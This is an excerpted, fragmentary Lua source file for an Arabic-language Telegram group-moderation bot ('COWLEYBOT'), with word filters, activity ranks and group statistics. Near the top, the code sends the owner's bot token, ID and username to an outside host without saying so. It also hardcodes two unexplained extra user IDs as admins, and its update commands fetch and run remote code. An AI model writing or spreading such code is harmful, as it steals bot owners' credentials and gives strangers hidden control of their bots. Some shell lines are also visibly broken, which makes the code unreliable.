...
https.request('http://bbbb.ml/COWLEYBOT/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("COWLEYBOT", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/COWLEYBOT
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./COWLEYBOT.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("UH", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S COWLEYBOT-X kill
screen -S COWLEYBOT./COWLEYBOT
done
]])  
file:close() 
...
sudo_users = {SUDO,1243875550,1167721871}   
function SudoBot(msg)  
local COWLEYBOT= false  
...
var = true  
elseif tonumber(user_id) == tonumber(1167721871) then
var = true  
...
local COWLEYBOT_Msg = ''  
if msgs < 100 then 
COWLEYBOT_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
COWLEYBOT_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
COWLEYBOT_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
COWLEYBOT_Msg = 'متفاعل' 
elseif msgs < 1200 then 
COWLEYBOT_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
COWLEYBOT_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
COWLEYBOT_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
COWLEYBOT_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
COWLEYBOT_Msg = 'قمة التفاعل' 
elseif msgs < 5500 then 
COWLEYBOT_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
COWLEYBOT_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
COWLEYBOT_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
COWLEYBOT_Msg = 'رب التفاعل'  
end 
return COWLEYBOT_Msg 
end
...
--------------------------------------------------------------------------------------------------------------
function SourceCOWLEYBOT(msg,data) -- بداية العمل
if msg then
...
if start then 
SourceCOWLEYBOTr = start
else
SourceCOWLEYBOTr = ' ゠ههلو عمري 💞⸼\n゠لتفعيل البوت في مجموعتك 𖧧.\n゠اضف البوت مشرف في مجموعتك 𖧧.\n゠ثم ارسل ◝ تفعيل ◟ 𖧧.'
end 
send(msg.chat_id_, msg.id_, SourceCOWLEYBOTr) 
end
end
...
send(msg.sender_user_id_, msg.id_,'܁༯┆هلو عمري 💞 ܰ\n܁༯┆سيتم الرد عليك [قريباً . .](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA)')
...
send(msg.chat_id_, msg.id_,COWLEYBOT_Msg) 
return false  
end 
if text then    
...
if text == 'معلومات السيرفر 📊' and SudoBot(msg) then 
 local text2 = 'Info Server : \n'
  local COWLEYBOT = database:info()
  text2 = text2..'1 - *Uptime Days* : `'..COWLEYBOT.server.uptime_in_days..'('..COWLEYBOT.server.uptime_in_seconds..' seconds)`\n'
  text2 = text2..'2 - *Commands Processed* : `'..COWLEYBOT.stats.total_commands_processed..'`\n'
  text2 = text2..'3 - *Expired Keys* : `'..COWLEYBOT.stats.expired_keys..'`\n'
  text2 = text2..'4 - *Ops/sec* : `'..COWLEYBOT.stats.instantaneous_ops_per_sec..'`\n'
send(msg.chat_id_, msg.id_, text2)  
end


if text == 'تحديث السورس ™' and SudoBot(msg) then 
os.execute('rm -rf COWLEYBOT.lua')
os.execute('wget https://raw.githubusercontent.com/CowleyIQ/COWLEYBOT/master/COWLEYBOT.lua')
send(msg.chat_id_, msg.id_,'🔭| تم تحديث البوت \n📮| لديك اخر اصدار سورس وطن\n📡| الاصدار ← { 1.2v}')
dofile('COWLEYBOT.lua')  
end
...
send(msg.chat_id_, msg.id_,'📌| عدد المجموعات الان » { '..#group..' }'..COWLEYBOTk..''..COWLEYBOT..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
local COWLEYBOT_Msg = database:get(bot_id.."COWLEYBOT:Add:Filter:Rp2"..text..msg.chat_id_)   
if COWLEYBOT_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
--------------------------------------------------------------------------------------------------------------
if COWLEYBOT_Msg and not Special(msg) then  
local COWLEYBOT_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if COWLEYBOT_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
send(msg.chat_id_, msg.id_,'܁༯┆ تم تعيين عدد الاعضاء سيتم تفعيل المجموعات التي اعضائها اكثر من  ◃ ['..Num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) عضو 💞 ܰ')
end
if text == 'تحديث السورس' and SudoBot(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
os.execute('rm -rf COWLEYBOT.lua')
os.execute('wget https://raw.githubusercontent.com/COWLEYBOTTEEM/COWLEYBOT/master/COWLEYBOT.lua')
...
🔖↬[The way his inauguration](https://t.me/COWLEYBOT/3)
...
send(msg.chat_id_, msg.id_,'܁༯┆تم وضع عدد االتكرار ◃ ◞ [('..Num..')](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ◟ 💞 ܰ')  
end 
...
database:set(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"܁༯┆ارسل التحذير عند ارسال الكلمة 💞 ܰ")  
database:set(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."COWLEYBOT1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."COWLEYBOT1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_,"܁༯┆تم منع الكلمه مع التحذير 💞 ܰ")  
database:del(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."COWLEYBOT1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."COWLEYBOT1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_,"܁༯┆ارسل الكلمةه الان 💞 ܰ ")  
database:set(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."COWLEYBOT1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."COWLEYBOT1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."COWLEYBOT1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."COWLEYBOT1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n٭ 𖤓┆قائمة المنع ☓💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
for k,v in pairs(list) do  
local COWLEYBOT_Msg = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t.."܁ 𖠵 "..k.." ゠ "..v.." ◃ ◞"..COWLEYBOT_Msg.."◜\n"    
end  
if #list == 0 then  
...
send(msg.chat_id_, msg.id_,'܁༯┆عدد رسائل الحلو ◃ ['..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) 💞 ܰ' ) 
end 
...
send(msg.chat_id_,msg.id_,'┐ هلو عمري 💞 ٭ \n┘ تم تنظيف ◞ ['..num..'](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ◜ رسالة ✓ ٭')
end
...
send(msg.chat_id_, msg.id_,'['..COWLEYBOT_Msg[math.random(#COWLEYBOT_Msg)]..']') 
return false
end
...
},function(ta,COWLEYBOT)
local t = "\n٭ 𖤓 ┆ههلاو يَمحتحتين 💞💞◟\n܀⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤⠤܀\n"
x = 0
local list = COWLEYBOT.members_
for k, v in pairs(list) do
x = x + 1
...
send(msg.chat_id_, msg.id_,"\n܁༯┆هلو عمري 💞 ܰ\n܁༯┆تم تنزيل [العضو](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) 💞 ܰ\n܁༯┆ ܊  "..dev..''..crr..''..cr..''..own..''..mod..''..vip.." ܊\n")
else
...
send(msg.chat_id_, msg.id_,'܁༯┆ارسل الرد الذي تريده 💞 ܰ\n܁༯┆سواء كان ▿\n܁༯┆[صوره](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ܊ [بصمه](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ܊ [فيد](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ܊ [متحركه](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ܊ [ملصق](https://t.me/joinchat/AAAAAEvr1yqOypm-GAojPA) ܰ')
...
-- vardump(data) 
COWLEYBOTdx(msg.chat_id_, msg.id_, '📤| ايدي المجموعة » ( '..msg.chat_id_..' )\n🚸| عدد الادمنيه » ( *'..data.administrator_count_..' )*\n📛| عدد المحظورين » ( *'..data.kicked_count_..' )*\n🏆| عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
COWLEYBOT= https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(COWLEYBOT)
...
--------------------------------------------------------------------------------------------------------------
SourceCOWLEYBOT(data.message_,data)
plugin_COWLEYBOTa(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
...
------------------------------------------------------------------------
local COWLEYBOTAbot = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWLEYBOTAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠┇العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n🚫┇["..COWLEYBOTAbot.."] \n") 
else
...
------------------------------------------------------------------------
if text then
local COWLEYBOT1_Msg = database:get(bot_id.."COWLEYBOT1:Add:Filter:Rp2"..text..result.chat_id_)   
if COWLEYBOT1_Msg then    
send(msg.chat_id_, msg.id_,"🔖┇"..COWLEYBOT1_Msg)
